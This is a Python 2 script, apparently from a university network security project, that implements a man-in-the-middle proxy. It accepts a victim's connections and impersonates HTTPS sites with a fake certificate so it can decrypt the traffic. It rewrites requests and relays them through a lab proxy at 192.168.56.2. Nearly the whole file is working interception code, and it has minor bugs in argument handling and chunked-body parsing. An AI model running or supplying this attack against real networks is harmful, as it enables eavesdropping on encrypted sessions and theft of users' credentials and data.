from socket import *
import ssl
import threading
import time
import re 
import httplib
import struct
import string
import os
import sys
import socket as Socket
import select

class Handler(threading.Thread):
    def __init__(self, socket, port) :
        threading.Thread.__init__(self)
        self.socket = socket
        if socket:
            self.client_port = socket.getpeername()[1]
        self.default_port = port
        # A flag to denote ssl state
        self.sslenable = False

    def init_ssl_connection(self, client_socket):
        # Use your fake certificate to establish connection to victim
        # This function should use
        # 1. send back "HTTP/1.1 200 Connection established\r\n\r\n"
        # 2. use  ssl.wrap_socket to establish ssl-wrap socket connect to victim(use fake certificate )
        # 3. return the ssl-wrap socket
        # ======== Your Code Here!! =======================
        client_socket.send("HTTP/1.1 200 Connection established\r\n\r\n")
        wsock = ssl.wrap_socket(client_socket, "myCA.pem", "myCA.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLS)

        return wsock

    def create_socket_and_connect_to_origin_dst(self, host, port):
        # if the port is not 443(http), create socket dirrect connect to the original website
        # if port is 443, create ssl.wrap_socket socket and connect to origin website
        # return the socket or wrap socket
        # ======== Your Code Here!! =======================
        sock = socket()
        if self.sslenable == True:
            sock = ssl.wrap_socket(sock)

        addr = Socket.gethostbyname(host)
        print 'connect to server [{} {} {}] from client [{}]'.format(host, addr, port, self.socket.getpeername()[1])
        sock.connect((addr, port))
        return sock

    def read_line(self, source_sock):
        # This function read a line from socket
        line = ""
        while True:
            char = source_sock.recv(1)
            line += char
            if not line.find("\r\n") == -1 :
                return line

    def read_num(self, source_sock, length):
        # read data with lenth from source_sock
        line = ""
        while len(line) < length:
            char = source_sock.recv(1)
            line += char
        return line

    def read_header(self, source_sock):
        #This function read the http header from socket
        header = ""
        line = source_sock.recv(1)

        data = line
        while len(line) :
            line = source_sock.recv(1)
            data += line
            if not data.find("\r\n\r\n")==-1 :
                header = data
                data = ""
                break;
        dic_header = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", header))
        #print dic_header
        #for (k,v) in dic_header.items():
        #        print k,":",v
        return dic_header, header

    def ReadHttp(self, source_sock):
        # Read whole Http packet, and return header and body in string type
        #dic_header, header = self.read_header(source_sock)
        res = self.read_header(source_sock)

        if not res:
            return

        dic_header = res[0]
        header = res[1]
        if 'User-Agent' in dic_header:
            self.user_agent = dic_header['User-Agent']

        body = ""
        if 'Transfer-Encoding' in dic_header and dic_header['Transfer-Encoding'] == 'chunked' :
            line = self.read_line(source_sock)
            body += line
            chunk_size = int(line,16)
            print "chunk size is {}".format(chunk_size)
            #while True :

            if chunk_size != 0 :
                line = self.read_num(source_sock, chunk_size+2)
                body += line

        else :
            if 'Content-Length' in dic_header :
                length = int(dic_header['Content-Length'])
            else :
                length = 0

            while length>0 :
                line = source_sock.recv(1)
                length -= len(line)
                body += line

            #self.PrinfContent(body)
        return header, body

    def print_content(self, content):
        index = 0
        part = 0x10
        print '[PrintContent]'

        while index < len(content):
            length = part if len(content) - index >= part else len(content) - index
            print "%08d" % index ,
            for i in range(index, index+length):
                print content[i : i+2].encode('hex').upper(),
                i += 1
            print_str = ""
            for i in range(index, index+length):
                if content[i] not in string.printable or content[i] in {'\n', '\r', '\t'}:
                    print_str += '.'
                else:
                    print_str += content[i]
            print print_str

            index += length

    def get_host_from_header(self, header):
        # Parsing first http packet and find
        # 1) if ssl enable, if header contain "CONNECT 192.168.6.131:443 HTTP/1.1"
        #   then it is https connection, and port and host are return
        # 2) port need to connect
        # 3) host need to conect
        if 'CONNECT' in header:
            self.sslenable = True
        #print "The header is: "+header
        m_host = re.search('Host: (.*)\r\n', header)
        host = m_host.group(1)
        #tokens = str(header).split('\r\n')
        #tokens = tokens[1].split(' ')
        #host = tokens[1]

        if self.sslenable == True:
            port = 443
        else:
            port = 80

        return host, port

    def simple_read(self, socket):
        return socket.recv(8192)

    def relay(self, rsock, host):
        inputs = [rsock, self.socket]
        outputs = []
        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is rsock:
                    raddr = rsock.getsockname()
                    #print '{0} {1} read server'.format(host, raddr[1])
                    #res = self.ReadHttp(s)
                    res = self.simple_read(s)
                    if res:
                        #self.print_content(res)
                        self.socket.sendall(res)
                    else:
                        print 'server [{} {}] close to client [{}]'.format(host, raddr[1], self.client_port)
                        self.socket.close()
                        rsock.close()
                        return
                else:
                    raddr = s.getpeername()
                    #print '{0} {1} read client'.format(host, raddr[1])
                    #res = self.ReadHttp(self.socket)
                    res = self.simple_read(s)
                    if res:
                        #rsock.send(res[0] + res[1])
                        #self.print_content(res)
                        rsock.sendall(res)
                    else:
                        print 'server [{} {}] was closed by client [{}]'.format(host, raddr[1], self.client_port)
                        self.socket.close()
                        rsock.close()
                        return

    def send_connect(self, host, proxy, proxy_port):
        sock = socket()
        #if self.sslenable == True:
        #    sock = ssl.wrap_socket(sock)
        #addr = Socket.gethostbyname(host)
        print 'connect to proxy [{} {}] from client [{}]'.format(proxy, proxy_port, self.socket.getpeername()[1])
        print 'CONNECT {} HTTP/1.1\r\n'.format(host)
        print 'Host: {}\r\n'.format(host)
        print 'User-Agent: {}\r\n'.format(self.user_agent)
        print 'Connection: keep-alive\r\n'
        print 'Proxy-Connection: keep-alive\r\n\r\n'

        sock.connect((proxy, proxy_port))

        sock.send('CONNECT {}:443 HTTP/1.1\r\n'.format(host))
        sock.send('Host: {}\r\n'.format(host))
        sock.send('User-Agent: {}\r\n'.format(self.user_agent))
        sock.send('Connection: keep-alive\r\n')
        sock.send('Proxy-Connection: keep-alive\r\n\r\n')

        return sock

    def redirect_proxy(self, host, proxy, proxy_port):
        sock = socket()

        sock.connect((proxy, proxy_port))

    def retrieve_original_addr(self, socket):
        SO_ORIGINAL_DST = 80
        dst = socket.getsockopt(Socket.SOL_IP, SO_ORIGINAL_DST, 16)
        port, raw_ip = struct.unpack_from("!2xH4s", dst)
        ip = Socket.inet_ntop(Socket.AF_INET, raw_ip)
        print 'The original addr is {}:{}'.format(ip, port)

    def run(self):
        self.retrieve_original_addr(self.socket)
        request = self.ReadHttp(self.socket)
        host, port = self.get_host_from_header(request[0])
        print 'aaa {}:{}'.format(host, port)

        if ("icloud" in host) or ("dropbox" in host) or ("apple" in host):
            return

        if ("wiki" not in host) and ("neverssl" not in host):
            return

        #if "facebook" not in host:
        #    return

        # self.send_connect(host, '192.168.56.2', 3128)


        if self.sslenable == True:
            #try:
            rsock = self.send_connect(host, '192.168.56.2', 3128)

            self.socket = self.init_ssl_connection(self.socket)
            request = self.ReadHttp(self.socket)

                #host,port = self.get_host_from_header(request[0])
            #except Exception as ex:
            #    print host
            #    print ex

        print request[0]
        mod_request = request[0].replace('Connection', 'Proxy-Connection')
        mod_request = mod_request.replace('GET /', 'GET http://neverssl.com')
        # rsock = self.create_socket_and_connect_to_origin_dst(host, int(port))
        rsock = self.create_socket_and_connect_to_origin_dst('192.168.56.2', 3128)

        # 4. Forward the request sent by user to the fakeSocket
        rsock.sendall(mod_request+request[1])

        print "Client [{}] Request Forwarding Success".format(self.client_port)
        # 5. Read response from fakeSocket and forward to victim's socket
        # 6. close victim's socket and fakeSocket
        response = self.ReadHttp(rsock)
        print "Server [{}] responded to client [{}]".format(host, self.client_port)
        #print "server msg: " + response[0]
        #self.print_content(response[1])
        self.socket.sendall(response[0]+response[1])
        print "Server sent"
                
        self.relay(rsock, host)

        # self.socket.close()
        # rsock.close()

        print "Connection Finished"

if __name__ == '__main__':

    if not len(sys.argv) == 2 :
        print "This program is Template of Proxy Level MITM Attack"
        print "This program is part of Network Security Project"
        print "Usage: python mitm.py <your address> <port>"
    ip = sys.argv[1]
    port = int(sys.argv[2])
    bind_address = (ip , port)

    server_socket = socket(AF_INET,SOCK_STREAM)
    server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    server_socket.bind(bind_address)
    server_socket.listen(1)
    threads = []
    data_dir = "/home/netsec/MITM-master/"

    while True :
        client_socket, addr = server_socket.accept()
        Handler(client_socket, port).start()


